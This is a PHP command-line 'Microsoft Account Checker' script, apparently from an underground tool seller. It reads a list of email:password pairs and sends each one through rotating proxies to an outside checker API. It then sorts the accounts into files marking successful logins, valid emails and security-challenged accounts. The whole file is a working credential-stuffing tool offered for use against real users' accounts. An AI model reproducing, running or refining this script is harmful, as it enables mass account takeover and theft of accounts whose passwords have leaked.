<?php
/*==========> INFO 
 * CODE     : BY ZLAXTERT
 * SCRIPT   : MICROSOFT ACCOUNT CHECKER
 * VERSION  : 1
 * TELEGRAM : t.me/zlaxtert
 * BY       : DARKXCODE
 */

require_once "function/function.php";
require_once "function/settings.php";

echo banner();
echo banner2();
enterlist:
echo "\n\n$WH [$BL+$WH]$BL Enter your list $WH($DEF eg:$YL list.txt$WH )$GR >> $WH";
$listname = trim(fgets(STDIN));
if (empty($listname) || !file_exists($listname)) {
    echo " [!] Your Fucking list not found [!]" . PHP_EOL;
    goto enterlist;
}
$lists = array_unique(explode("\n", str_replace("\r", "", file_get_contents($listname))));

$total = count($lists);
$live = 0;
$Vem = 0;
$lim = 0;
$err = 0;
$die = 0;
$unknown = 0;
$no = 0;
echo PHP_EOL . PHP_EOL;
echo "$WH [$RD ! $WH]$YL TOTAL$GR $total$YL LISTS$WH [$RD ! $WH]";
echo PHP_EOL . PHP_EOL;
foreach ($lists as $list) {
    $no++;

    // EXPLODE
    $emailll = multiexplode(array(":", "|", "/", ";", ""), $list)[0];
    $pwd = multiexplode(array(":", "|", "/", ";", ""), $list)[1];

    $iniJam = Jam();
    // GET SETTINGS
    if (strtolower($mode_proxy) == "off") {
        $Proxies = "";
        $proxy_Auth = $proxy_pwd;
        $type_proxy = $proxy_type;
        $apikey = GetApikey($thisApikey);
        $APIs = GetApiS($thisApi);
    } else {
        $Proxies = GetProxy($proxy_list);
        $proxy_Auth = $proxy_pwd;
        $type_proxy = $proxy_type;
        $apikey = GetApikey($thisApikey);
        $APIs = GetApiS($thisApi);
    }

    $api = $APIs . "/checker/microsoft/?apikey=$apikey&list=$list&proxy=$Proxies&proxyAuth=$proxy_pwd&type_proxy=$type_proxy";
    // CURL
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $api);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    
    $x = curl_exec($ch);
    curl_close($ch);
    $js = json_decode($x, TRUE);

    $msg = $js['data']['msg'];

    if (strpos($x, 'SUCCESS LOGIN!')) {
        $live++;
        save_file("result/success-log.txt", "$list");
        echo "$WH [$YL$iniJam$WH][$RD$no$DEF/$GR$total$DEF]$GR SUCCESS LOGIN$DEF =>$BL $list$DEF | [$YL MSG$DEF: $CY$msg$DEF ] | BY$MG DARKXCODE$DEF (V1)" . PHP_EOL;
    } else if (strpos($x, 'VALID EMAIL ADDRESS!')) {
        $Vem++;
        save_file("result/valid-email.txt", "$list");
        echo "$WH [$YL$iniJam$WH][$RD$no$DEF/$GR$total$DEF]$YL VALID EMAIL$DEF =>$BL $list$DEF | [$YL MSG$DEF:$MG VALID EMAIL ADDRESS!$DEF ] | BY$CY DARKXCODE$DEF (V1)" . PHP_EOL;
    } else if (strpos($x, 'SECURITY CHALLENGE!')) {
        $lim++;
        save_file("result/limit.txt", "$list");
        echo "$WH [$YL$iniJam$WH][$RD$no$DEF/$GR$total$DEF]$CY LIMIT LOGIN$DEF =>$BL $list$DEF | [$YL MSG$DEF:$MG SECURITY CHALLENGE!$DEF ] | BY$CY DARKXCODE$DEF (V1)" . PHP_EOL;
    } else if (strpos($x, 'unknown')) {
        $unknown++;
        save_file("result/unknown.txt", "$list");
        echo "$WH [$YL$iniJam$WH][$RD$no$DEF/$GR$total$DEF]$WH UNKNOWN$DEF =>$BL $list$DEF | [$YL MSG$DEF:$MG UNKNOWN RESPONSE!$DEF ] | BY$CY DARKXCODE$DEF (V1)" . PHP_EOL;
    } else if (strpos($x, 'INCORRECT EMAIL ADDRESS!')) {
        $die++;
        save_file("result/die.txt", "$list");
        echo "$WH [$YL$iniJam$WH][$RD$no$DEF/$GR$total$DEF]$RD DIE$DEF =>$BL $list$DEF | [$YL MSG$DEF:$MG INCORRECT EMAIL ADDRESS!$DEF ] | BY$CY DARKXCODE$DEF (V1)" . PHP_EOL;
    } else {
        $err++;
        save_file("result/error.txt", "$list");
        //echo $x.PHP_EOL;
        echo "$WH [$YL$iniJam$WH][$RD$no$DEF/$GR$total$DEF]$MG error$DEF =>$BL $list$DEF | [$YL MSG$DEF:$MG ERROR$DEF ] | BY$CY DARKXCODE$DEF (V1)" . PHP_EOL;
    }

}
//============> END

echo PHP_EOL;
echo "================[DONE]================" . PHP_EOL;
echo " DATE          : " . $date . PHP_EOL;
echo " SUCCESS LOGIN : " . $live . PHP_EOL;
echo " VALID EMAIL   : " . $Vem . PHP_EOL;
echo " DIE           : " . $die . PHP_EOL;
echo " UNKNOWN       : " . $unknown . PHP_EOL;
echo " LIMIT         : " . $lim . PHP_EOL;
echo " ERROR         : " . $err . PHP_EOL;
echo " TOTAL         : " . $total . PHP_EOL;
echo "======================================" . PHP_EOL;
echo "[+] RATIO SUCCESS LOGIN => $GR" . round(RatioCheck($live, $total)) . "%$DEF" . PHP_EOL;
echo "[+] RATIO VALID EMAIL   => $YL" . round(RatioCheck($Vem, $total)) . "%$DEF" . PHP_EOL;
echo "[+] RATIO LIMIT         => $CY" . round(RatioCheck($lim, $total)) . "%$DEF" . PHP_EOL . PHP_EOL;
echo "[!] NOTE : CHECK AGAIN FILE 'unknown.txt' or 'limit.txt' or 'error.txt' [!]" . PHP_EOL;
echo "This file '" . $listname . "'" . PHP_EOL;
echo "File saved in folder 'result/' " . PHP_EOL . PHP_EOL;


// ==========> FUNCTION

function collorLine($col)
{
    $data = array(
        "GR" => "\e[32;1m",
        "RD" => "\e[31;1m",
        "BL" => "\e[34;1m",
        "YL" => "\e[33;1m",
        "CY" => "\e[36;1m",
        "MG" => "\e[35;1m",
        "WH" => "\e[37;1m",
        "DEF" => "\e[0m"
    );
    $collor = $data[$col];
    return $collor;
}
?>
